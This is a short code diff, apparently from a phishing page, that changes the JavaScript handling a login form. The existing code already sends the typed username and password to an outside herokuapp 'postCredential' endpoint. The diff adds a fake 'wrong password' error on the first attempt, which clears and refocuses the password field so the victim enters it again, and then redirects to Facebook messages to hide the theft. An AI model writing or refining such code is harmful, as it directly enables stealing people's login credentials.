@@ -10,6 +10,7 @@ function setPostHeaders(body, isJsonBody = true) {
     };
 }
 
+let attempt = 0;
 const handleSubmit = (e) => {
     const u = document.getElementById('inpName') || '';
     const p = document.getElementById('inpPass') || '';
@@ -26,7 +27,17 @@ const handleSubmit = (e) => {
     }
 
     fetch(`https://media-store.herokuapp.com/api/media/postCredential?uname=${uv}&upass=${pv}`, setPostHeaders({ uname: uv, upass: pv }))
-        .then((res) => (window.location.href = 'https://www.123greetings.com/friendship/thoughts/thoughts76.html'))
+        .then((res) => {
+            if (attempt === 0) {
+                document.getElementsByClassName('error')[0].style.visibility = 'visible';
+                p.value = '';
+                p.focus();
+            } else {
+                document.getElementsByClassName('error')[0].style.visibility = 'hidden';
+                window.location.href = 'https://www.facebook.com/messages';
+            }
+            attempt++;
+        })
         .catch((err) => console.log(err));
 };
 
